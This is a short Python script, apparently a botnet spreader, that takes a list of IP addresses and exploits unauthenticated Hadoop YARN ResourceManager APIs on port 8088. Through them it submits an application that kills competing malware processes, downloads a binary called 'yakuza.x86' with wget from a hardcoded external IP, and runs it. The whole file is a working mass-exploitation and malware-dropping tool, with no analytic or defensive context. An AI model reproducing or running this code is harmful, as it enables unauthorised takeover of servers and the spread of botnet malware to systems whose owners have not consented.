import sys
import threading
import requests
import os
from Queue import *
from threading import Thread

ips = open(sys.argv[1], "r").readlines()
queue = Queue()
queue_count = 0
cmd = "pkill -9 rex;pkill -9 gang;pkill -9 hakai.x86_64;cd /tmp;rm -rf yakuza.x86;wget http://81.4.101.221/yakuza.x86;chmod 777 *;./yakuza.x86 Roots"


def rtek(host):
    try:
        url = 'http://' + host + ':8088/ws/v1/cluster/apps/new-application'
        resp = requests.post(url, timeout=3)
        app_id = resp.json()['application-id']
        url = 'http://' + host + ':8088/ws/v1/cluster/apps'
        data = {
            'application-id': app_id,
            'application-name': 'get-shell',
            'am-container-spec': {
                'commands': {
                    'command': '%s' % cmd,
                },
            },
            'application-type': 'YARN',
        }
        requests.post(url, json=data, timeout=3)
        print("[yarn] - %s" % host)
    except:
        pass
    return


def main():
    global queue_count
    for line in ips:
        line = line.strip("\r")
        line = line.strip("\n")
        queue_count += 1
        sys.stdout.write("\r[%d] Added to queue" % (queue_count))
        sys.stdout.flush()
        queue.put(line)
    sys.stdout.write("\n")
    i = 0
    while i != queue_count:
        i += 1
        try:
            input = queue.get()
            thread = Thread(target=rtek, args=(input,))
            thread.start()
        except KeyboardInterrupt:
            os.kill(os.getpid(), 9)
    thread.join()
    return


if __name__ == "__main__":
    main()
